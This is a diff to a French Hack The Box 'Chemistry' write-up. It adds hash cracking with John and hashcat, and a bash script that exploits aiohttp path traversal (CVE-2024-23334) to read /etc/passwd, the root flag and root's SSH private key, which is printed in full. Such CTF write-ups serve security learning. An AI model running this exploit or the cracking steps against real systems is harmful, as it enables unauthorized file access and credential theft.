@@ -856,18 +856,22 @@ cat user.txt
 8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
 ```
 
-Tu récupères ainsi le **flag user.txt**
+**Tu récupères ainsi facilement le flag user.txt**
 
+### Voie plus classique
 
-
-------
+Tu peux également trouver les crédentiels en suivant une voie plus classique avec `John the Ripper` ou `hashcat` et la wordlist `rockyou.txt`
 
 
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
 └─$ echo "63ed86ee9f624c7b14f1d4f43dc251a5" > hash.txt
-                                                                                                                       
+```
+
+#### John
+
+```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
 └─$ john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
@@ -879,7 +883,11 @@ unicorniosrosados (?)
 1g 0:00:00:00 DONE (2026-02-14 10:55) 8.333g/s 24848Kp/s 24848Kc/s 24848KC/s unihmaryanih..unicornios2805
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed. 
-                                                                                                                       
+```
+
+#### Hashcat
+
+```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
 └─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 hashcat (v7.1.2) starting
@@ -948,56 +956,11 @@ Started: Sat Feb 14 10:56:01 2026
 Stopped: Sat Feb 14 10:56:13 2026
                                                                                                                        
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
-└─$
+└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force --show
+63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
 ```
 
 
-
-```bash
-                                                                                                                       
-┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
-└─$ ssh rosa@chemistry.htb       
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-rosa@chemistry.htb's password: 
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Sat 14 Feb 2026 10:00:17 AM UTC
-
-  System load:           0.0
-  Usage of /:            72.6% of 5.08GB
-  Memory usage:          23%
-  Swap usage:            0%
-  Processes:             231
-  Users logged in:       0
-  IPv4 address for eth0: 10.129.231.170
-  IPv6 address for eth0: dead:beef::250:56ff:fe94:b788
-
-...
-
-rosa@chemistry:~$ 
-```
-
-
-
-
-
-```bash
-rosa@chemistry:~$ ls -l
-total 4
--rw-r----- 1 root rosa 33 Feb 14 08:56 user.txt
-rosa@chemistry:~$ cat user.txt
-35afxxxxxxxxxxxxxxxxxxxxxxxxxxxac29
-```
-
-
-
----
 
 ## Escalade de privilèges
 
@@ -1213,17 +1176,44 @@ L’en-tête `Server` indique qu’il tourne sous **Python 3.9 avec aiohttp 3.9.
 
 Nous avons donc affaire à une application web interne développée en Python.
 
-Dans un contexte CTF, un service interne en Python accessible uniquement en local constitue une piste sérieuse d’escalade :
+Dans un contexte CTF, un service interne en Python accessible uniquement en local constitue une piste sérieuse d’escalade.
 
 
 
 
 
-![Recherche des exploits de aiohttp/3.9.1 sur Google](aiohttp-3_9_1-exploit-poc-github.png)
-
-prends https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC
 
 
+avec https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
+
+voici le script `exploit.sh`proposé :
+
+```python
+#!/bin/bash
+
+url="http://localhost:8081"
+string="../"
+payload="/static/"
+file="etc/passwd" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+
+Le script cible`http://localhost:8081` le point d’entrée du service **aiohttp** et ajoute progressivement des `../` après `/static/` afin de remonter dans l’arborescence du serveur. L’option `--path-as-is` permet d’envoyer le chemin exactement tel qu’il est écrit, sans correction automatique.
+
+Dès qu’un code HTTP `200` apparaît, cela signifie que tu as réussi à sortir du dossier `/assets/` et à accéder à un fichier sensible comme `/etc/passwd`, confirmant une vulnérabilité de type path traversal.
+
+Tu sais que ton service **aiohttp** écoute en local sur `http://127.0.0.1:8080` et en inspectant la page avec `curl | grep src`, tu constates que les fichiers statiques sont servis depuis le répertoire `/assets/`.
 
 ```bash
 rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
@@ -1233,28 +1223,115 @@ rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
 rosa@chemistry:~$ 
 ```
 
+tu modifies alors le script en conséquence
 
+```python
+#!/bin/bash
 
-```bash
-./lfi_aiohttp.sh -f root/root.txt
+url="http://127.0.0.1:8080" # modifié
+string="../"
+payload="/assets/" # modifié
+file="etc/passwd" # without the first /
 
-[+] Curl output to the resulting url: http://localhost:8080/assets/../../../root/root.txt.
-
-
-75e6057484b1b41781c68b9c66150eae
-
-[+] File dumped successfully.
-
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
 ```
 
-
+résultat :
 
 ```bash
-rosa@chemistry:~$ ./lfi_aiohttp.sh -f root/.ssh/id_rsa
+rosa@chemistry:~$ bash exploit.sh
+[+] Testing with /assets/../etc/passwd
+	Status code --> 404
+[+] Testing with /assets/../../etc/passwd
+	Status code --> 404
+[+] Testing with /assets/../../../etc/passwd
+	Status code --> 200
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+app:x:1001:1001:,,,:/home/app:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+```
 
-[+] Curl output to the resulting url: http://localhost:8080/assets/../../../root/.ssh/id_rsa.
+### flag root.txt
 
+Et, pour être très pragmatique, tu modifies directement la variable cible dans le script pour lire `/root/root.txt`, ce qui te permet d’aller droit à l’essentiel une fois la vulnérabilité validée.
 
+```python
+file="root/root.txt" # without the first /
+```
+
+ce qui te donne directement le flage root.txt
+
+```bash
+bash exploit.sh
+[+] Testing with /assets/../root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../../root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../../../root/root.txt
+	Status code --> 200
+7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
+```
+
+et avec :
+
+```python
+file="root/.ssh/id_rsa" # without the first /
+```
+
+**tu obtiens même la clé ssh de l'utilisateur root**
+
+```bash
+bash exploit.sh
+[+] Testing with /assets/../root/.ssh/id_rsa
+	Status code --> 404
+[+] Testing with /assets/../../root/.ssh/id_rsa
+	Status code --> 404
+[+] Testing with /assets/../../../root/.ssh/id_rsa
+	Status code --> 200
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
@@ -1294,9 +1371,6 @@ OlOfMO4xkLwj4rPIcqbGzi0Ant/O+V7NRN/mtx7xDL7oBwhpRDE1Bn4ILcsneX5YH/XoBh
 1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 
-[+] File dumped successfully.
-
-rosa@chemistry:~$ 
 ```
 
 
@@ -1349,7 +1423,7 @@ root@chemistry:~# ls -l
 total 4
 -rw-r----- 1 root root 33 Feb 24 14:37 root.txt
 root@chemistry:~# cat root.txt
-75e6057484b1b41781c68b9c66150eae
+7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
 root@chemistry:~# 
 ```
 
